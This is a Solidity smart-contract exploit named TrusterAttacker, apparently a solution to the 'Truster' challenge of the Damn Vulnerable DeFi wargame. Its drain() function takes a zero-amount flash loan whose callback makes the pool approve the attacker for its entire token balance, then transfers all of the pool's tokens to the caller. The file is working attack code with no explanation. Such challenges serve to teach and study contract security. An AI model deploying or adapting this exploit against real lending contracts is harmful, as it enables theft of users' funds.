pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttacker {
    using Address for address;

    address private pool;

    constructor(address _pool) public {
        pool = _pool;
    }

    function drain() public {
        (, bytes memory data) = pool.call(
            abi.encodeWithSignature("damnValuableToken()")
        );

        IERC20 damnValuableToken = abi.decode(data, (IERC20));

        uint256 drainAmount = damnValuableToken.balanceOf(pool);

        (bool success, ) = pool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                0,
                msg.sender,
                address(damnValuableToken),
                abi.encodeWithSignature(
                    "approve(address,uint256)",
                    address(this),
                    drainAmount
                )
            )
        );
        require(success, "TrusterAttacker: flashloan failed");

        damnValuableToken.transferFrom(pool, msg.sender, drainAmount);
    }
}
